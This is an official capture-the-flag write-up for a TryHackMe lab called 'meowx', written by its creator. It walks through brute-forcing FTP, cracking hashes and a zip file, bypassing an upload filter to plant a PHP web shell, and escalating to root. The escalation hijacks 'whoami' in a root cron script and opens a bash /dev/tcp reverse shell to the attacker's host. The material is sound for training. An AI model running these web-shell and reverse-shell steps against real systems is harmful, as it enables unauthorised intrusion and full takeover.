# Official Write-up for TryHackMe's meowx
---
This is an official write up of TryHackMe's meowx from the creator of this room. Any question related to the room feel free to reach me out at [@CroftRofik](https://twitter.com/CroftRofik) or `lara.crofwick@gmail.com`.
#### Let's get started
Given the IP ADDRESS, doing nmap port scan, found 3 ports are open as shown below:
```bash
PORT   STATE  SERVICE  VERSION
21/tcp open   ftp      vsftpd 3.0.3
22/tcp open   ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5c:01:df:65:c0:6a:bd:cc:73:bb:dd:00:25:a6:4d:a9 (RSA)
|   256 62:91:1a:e8:d0:a4:43:3c:7c:4e:74:cb:4a:0a:5b:2d (ECDSA)
|_  256 da:09:c5:75:d1:28:ec:90:bc:81:52:55:fe:29:51:d6 (ED25519)
80/tcp open   http     Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Official Website | meowx
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
Things to note about nmap port scan result:
- ftp service is open, but it does not enable `anonymous access` so we need credentials to log in. Unfortunately, we have no credentials at the moment
- ssh service is open, but we have no credentials to access
- there is a web server which we can try to do enumeration information as much as possible

Let's do the enumeration on web server!!
Doing *directory bruteforcing* on web server found these files as shown below:
&nbsp;
![[gobust 1.jpg]]
&nbsp;
Browsing to `administrator.php` via web browser we get redirected to `admin.php`. This part is easy to look over as it is a redirection. But if we visit `administrator.php` using Burpsuite or curl, it is hinting us about something crucial as shown below:
```bash
curl http://10.10.207.110/administrator.php
<!DOCTYPE html>
<html>
    <head>
        <title>Admin Panel</title>
    </head>
    <body>
        <h1>Good ol' Admin Panel</h1>
        <p>This right here used to be an old Admin Panel. Since we upgraded our site, it is now located at <b>admin.php</b></p>
        <h5>Happy Hacking ^^ !!!!!!!</h5>
        <!--
            Aye yo nick my man! your ftp password is weak! consider changing it asap cuz i've looked up the rockyou.txt and your password is in there.
            Don't be careless. Use password generator for a more secure password. Thanks.
        -->
    </body>
</html>
```
with that, we have the information of `nick` as a *ftp* user and *has a weak password*. With that, we bruteforce `nick` ftp password with *hydra*
&nbsp;
![[ftp-brute 1.jpg]]
&nbsp;
Now we have the *ftp* credentials. Let's log in and see what *ftp* provides for us.
&nbsp;
![[ftp-get 1.jpg]]
&nbsp;
There are some files in *ftp* , i downloaded `web-backup-src.zip` and `my-todo.txt`. Reading `my-todo.txt` and we get the following result:
```txt
List of TO-DO's
########################################
1. Complete programming assignments II

2. Complete some CTF challenges

3. Edit the credentials in MySQL database to a new one (dGhlIGNyZWRzIHVzZWQgdG8gbG9nIGluIHRvIG15c3FsIGlzIGpvc2U6YmM2NGU1YTVlNGNkNDk1MDQyZDI5OGMxMTZjYTRjN2U=)

4. Check emails

5. Watch some shows on Netflix ^^

6. Supper timeee!!!!!
```

Things to note from `my-todo.txt`:
- there is *mysql* running locally (that's why nmap does not return the result of *mysql*)
- the base64 encoded string could hint us something crucial so let's decode it.
- decode the base64 string we get the result: `the creds used to log in to mysql is jose:bc64e5a5e4cd495042d298c116ca4c7e` but password seems to be in a hash format so let's crack it on [crackstation](https://crackstation.net/) (or you can crack it using your favorite tool eg. *JohnTheRipper, Hashcat*)
&nbsp;
![[mysql-pwd 1.jpg]]

Another file we have is `web-backup-src.zip` but it is password protected so we have to crack the password to view contents of the file. I do it using `fcrackzip`
```bash
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt web-backup-src.zip 


PASSWORD FOUND!!!!: pw == <REDACTED>
```
As we can see `fcrackzip` successfully crack the zip password for us. Upon *unzipping* the zip file we get the following files
```bash
-rw-r--r-- 1 root root  655 Sep 24 19:31 administrator.php
-rw-r--r-- 1 root root 2450 Sep 26 07:49 admin.php
drwxr-xr-x 2 root root 4096 Nov 18 20:48 css
-rw-r--r-- 1 root root 6706 Sep 26 20:15 dashboard.php
drwxr-xr-x 2 root root 4096 Nov 18 20:48 img
-rw-r--r-- 1 root root 3628 Sep 26 21:08 index.html
-rw-r--r-- 1 root root  874 Sep 24 18:23 login.php
-rw-r--r-- 1 root root  298 Sep 24 18:36 logout.php
```
Now we have the source code of the web site. Looking at `login.php` reveals us the credential that we can use to log in on the website.
```php
if($username === "<REDACTED>" && md5($password) === "<REDACTED>")
```
Let's browse to `admin.php` and log in to the website. If we log in successfully we will be redirected to `dashboard.php`:
&nbsp;
![[dashboard 1.jpg]]
&nbsp;
Now we can browse to `upload.php` to upload the file. Let's try to upload our *reverse shell* to the server. My *reverse shell* script looks fairly simple like this:
```php
<?php
        $cmd = $_REQUEST["cmd"];
        echo(system($cmd));
?>
```
Let's try to upload it:
&nbsp;
![[up-fail 1.jpg]]
&nbsp;
The web server won't allow us to upload our *reverse shell* script because it does not allow `.php` extension. Let's try to upload a file with double extension `.jpg.php` to see if it works:
&nbsp;
![[up-fail 2.jpg]]
&nbsp;
As we can see it still won't allow us to upload our script. Let's give it another try and upload with `.php.jpg` extension:
&nbsp;
![[up-succ 1.jpg]]
&nbsp;
As we can see, our *reverse shell* script is successfully uploaded to the server and is in `/uploads` directory. Let's browse to the file and get our *reverse shell* so we can control the server remotely. But first lets set up our *netcat listener* at port *9001* with 
```bash
nc -lvnp 9001
```
Now we have a shell on the server:
&nbsp;
![[revshell 1.jpg]]
> Additional tip: spawn an interactive shell with python as it helps working with the shell much easier.

Remember about the `my-todo.txt`, we have *mysql* running locally and we also have credentials to access *mysql* so let's access *mysql* and see what it provides us: *mysql* has a database *user* and a table called *creds*. We can view record od *creds* table:
&nbsp;
![[mysql-access 1.jpg]]
&nbsp;
It seems that *creds* table contain a record of a user called `alejandro` along with his *password hash*. Let's copy the *hash* and attempt to crack it. For this i use *JohnTheRipper* to do so and get a result as the following:
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
Warning: detected hash type "sha512crypt", but the string is also recognized as "HMAC-SHA256"
Use the "--format=HMAC-SHA256" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
<REDACTED>         (?)
1g 0:00:00:31 DONE (2021-11-25 22:31) 0.03191g/s 3521p/s 3521c/s 3521C/s red411..partzz
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```
Now we have `alejandro` and his password, let's change to his user to attempt to do *privilege escalation*. After change our user to `alejandro` we can read the `user.txt` and attempt to get the flag from it.
Now let's escalate our privilege to be *root*. When we list the content inside `/home/alejandro` we get this following result:
```bash
drwxr-xr-x 4 alejandro alejandro 4096 พ.ย.  23 20:32 ./
drwxr-xr-x 5 root      root      4096 พ.ย.  23 09:10 ../
lrwxrwxrwx 1 alejandro alejandro    9 พ.ย.  23 20:32 .bash_history -> /dev/null
-rw-r--r-- 1 alejandro alejandro  220 เม.ย.  5  2018 .bash_logout
-rw-r--r-- 1 alejandro alejandro 3771 เม.ย.  5  2018 .bashrc
-rw-r--r-- 1 alejandro alejandro 8980 เม.ย. 16  2018 examples.desktop
drwx------ 3 alejandro alejandro 4096 พ.ย.  23 20:12 .gnupg/
drwxrwxr-x 3 alejandro alejandro 4096 พ.ย.  23 09:29 .local/
-rw------- 1 alejandro alejandro   61 พ.ย.  23 09:39 .mysql_history
-rw-r--r-- 1 alejandro alejandro  807 เม.ย.  5  2018 .profile
-rw------- 1 alejandro alejandro   22 พ.ย.  23 10:28 .python_history
-rwxr--r-- 1 root      root       144 พ.ย.  23 09:19 .test-script.sh*
-r-------- 1 alejandro alejandro   27 พ.ย.  23 09:51 user.txt
```
Notice that there is a *bash* script called `.test-script.sh` we might be on to something. The script belongs to *root* and is only *readable*, no write permission and execute permission. So we can't really do anything with that. The content of `.test-script.sh` is as follow:
```bash
#!/bin/bash

/usr/bin/ping -c 2 wttr.in
/usr/bin/nslookup wttr.in
/usr/bin/curl https://wttr.in/Bangkok
whoami
/usr/bin/id
/usr/bin/uname -snrv
```
Notice that every command in the script is in full path except one command, `whoami`. We can attempt to do *path hijacking* by creating our custom *whoami script*. But first we need to investigate how the *script* being executed and when it is being executed. We can do that by using a *script* called *pspy64s* (it can be found on *Github*). First let's host our web server (on our machine) so we can download it. I use python to host a web server.
```bash
python3 -m http.server 80
```
on the victim's machine, download it using `wget`:
```bash
wget 10.9.4.166/pspy64s
```
Let's make it executable then run it:
```bash
chmod +x pspy64s
./pspy64s
```
After a while, the result comes back:
```bash
<--snip-->
2021/11/26 11:10:02 CMD: UID=0    PID=9907   | /usr/sbin/cron -f 
2021/11/26 11:10:03 CMD: UID=0    PID=9909   | /usr/sbin/CRON -f 
2021/11/26 11:10:04 CMD: UID=0    PID=9910   | /bin/bash /home/alejandro/.test-script.sh 
2021/11/26 11:10:05 CMD: UID=0    PID=9911   | /bin/bash /home/alejandro/.test-script.sh 
<--snip-->
```
We can confirm that `.test-script.sh` is being executed as a part of the cronjob belongs to root. Now we can escalate our privilege by creating our custom `whoami`. My custom `whoami` is having it creates a reverse shell connection to my machine as *root* so i can control the system as *root* user. Let's do it. First we need to set up our *netcat listener* on our machine:
```bash
nc -lvnp 9999
```
I use *nano* text editor to create the file. The content of the file looks as follow:
```sh
#!/bin/bash

bash -c 'exec bash -i &>/dev/tcp/10.9.4.166/9999 <&1'
```
Save the file and make it executable:
```bash
chmod +x whoami
```
After a while we get a *reverse shell* connection back to our machine and we are *root* user on the machine
&nbsp;
![[root 1.jpg]]
&nbsp;
Now that we are *root*, we can read the `root.txt` file located at `/root` and get the flag then submit to complete the room.
&nbsp;
So guys that's it for this room. I hope this write-up helps you as much as it's meant to. Thank you for completing the room. I hope you can learn something from this room. Any question, complaint, compliment you can reach me at [@CroftRofik](https://twitter.com/CroftRofik) or `lara.crofwick@gmail.com`.


